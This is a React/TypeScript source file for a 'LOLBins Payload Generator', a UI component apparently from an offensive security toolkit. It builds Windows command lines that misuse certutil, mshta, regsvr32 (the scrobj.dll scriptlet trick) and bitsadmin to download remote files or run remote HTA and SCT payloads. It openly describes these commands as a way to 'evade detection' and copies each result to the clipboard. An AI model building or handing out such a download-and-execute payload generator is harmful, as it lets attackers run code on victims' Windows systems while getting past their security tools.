
'use client';

import { useState, useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { Terminal, Code, Clipboard, Sparkles, Binary } from 'lucide-react';
import { Label } from '@/components/ui/label';
import { getUserSettings } from '@/services/user-settings-service';

const lolbins = {
  certutil: {
    name: 'certutil.exe',
    description: 'Download a remote file.',
    params: {
      url: { label: 'URL to File', placeholder: 'http://example.com/file.exe', required: true },
      output: { label: 'Output File Name', placeholder: 'file.exe', required: true },
    },
    generate: (p: any) => `certutil.exe -urlcache -split -f ${p.url} ${p.output}`,
  },
  mshta: {
    name: 'mshta.exe',
    description: 'Execute a remote HTA script.',
    params: {
      url: { label: 'URL to HTA file', placeholder: 'http://example.com/payload.hta', required: true },
    },
    generate: (p: any) => `mshta.exe ${p.url}`,
  },
  regsvr32: {
    name: 'regsvr32.exe',
    description: 'Execute a remote scriptlet file.',
    params: {
      url: { label: 'URL to SCT file', placeholder: 'http://example.com/payload.sct', required: true },
    },
    generate: (p: any) => `regsvr32.exe /s /n /u /i:${p.url} scrobj.dll`,
  },
  bitsadmin: {
    name: 'bitsadmin.exe',
    description: 'Download a file using BITS.',
    params: {
      url: { label: 'URL to File', placeholder: 'http://example.com/file.txt', required: true },
      output: { label: 'Full Output Path', placeholder: 'C:\\Users\\Public\\file.txt', required: true },
    },
    generate: (p: any) => `bitsadmin.exe /transfer myjob /download /priority high ${p.url} ${p.output}`,
  },
};

type LolbinKey = keyof typeof lolbins;

const formSchema = z.object({
  lolbin: z.string(),
  params: z.record(z.string()),
});

export function LolbinsPayloadGenerator() {
  const [generatedCommand, setGeneratedCommand] = useState<string | null>(null);
  const { toast } = useToast();

  const form = useForm({
    resolver: zodResolver(formSchema),
    defaultValues: {
      lolbin: 'certutil',
      params: { url: '', output: '' },
    },
  });
  
  useEffect(() => {
    async function loadDefaults() {
      const settings = await getUserSettings();
      if(settings.lolbins.default) {
        form.setValue('lolbin', settings.lolbins.default);
      }
    }
    loadDefaults();
  }, [form]);

  const selectedLolbinKey = form.watch('lolbin') as LolbinKey;
  const selectedLolbin = lolbins[selectedLolbinKey];

  function onSubmit(values: z.infer<typeof formSchema>) {
    const requiredParams = Object.keys(lolbins[values.lolbin as LolbinKey].params);
    for (const param of requiredParams) {
      if (!values.params[param]) {
        form.setError(`params.${param}`, { message: 'This field is required.' });
        return;
      }
    }
    const command = lolbins[values.lolbin as LolbinKey].generate(values.params);
    setGeneratedCommand(command);
  }

  const handleCopy = () => {
    if (generatedCommand) {
      navigator.clipboard.writeText(generatedCommand);
      toast({ title: 'Copied!', description: 'Payload copied to clipboard.' });
    }
  };
  
  const handleLolbinChange = (value: string) => {
    form.setValue('lolbin', value);
    form.setValue('params', {}); // Reset params on change
    setGeneratedCommand(null); // Clear generated command
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
          <Binary className="h-6 w-6" />
          <CardTitle>LOLBins Payload Generator</CardTitle>
        </div>
        <CardDescription>
          Generate command-line payloads using trusted OS binaries to evade detection.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <FormField
              control={form.control}
              name="lolbin"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Living-off-the-Land Binary</FormLabel>
                  <Select onValueChange={handleLolbinChange} value={field.value}>
                    <FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl>
                    <SelectContent>
                      {Object.entries(lolbins).map(([key, value]) => (
                        <SelectItem key={key} value={key}>{value.name} - {value.description}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </FormItem>
              )}
            />
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {Object.entries(selectedLolbin.params).map(([paramName, paramConfig]) => (
                <FormField
                  key={paramName}
                  control={form.control}
                  name={`params.${paramName}`}
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>{paramConfig.label}</FormLabel>
                      <FormControl><Input placeholder={paramConfig.placeholder} {...field} /></FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              ))}
            </div>

            <Button type="submit">
              <Sparkles className="mr-2 h-4 w-4" />
              Generate Payload
            </Button>
          </form>
        </Form>
      </CardContent>

      {generatedCommand && (
        <CardFooter className="flex-col items-start gap-4 border-t pt-6">
          <Label>Generated Payload</Label>
          <div className="flex w-full items-center gap-2">
            <Input readOnly value={generatedCommand} className="font-mono bg-primary/20" />
            <Button type="button" size="icon" variant="outline" onClick={handleCopy}>
              <Clipboard className="h-4 w-4" />
            </Button>
          </div>
        </CardFooter>
      )}
    </Card>
  );
}
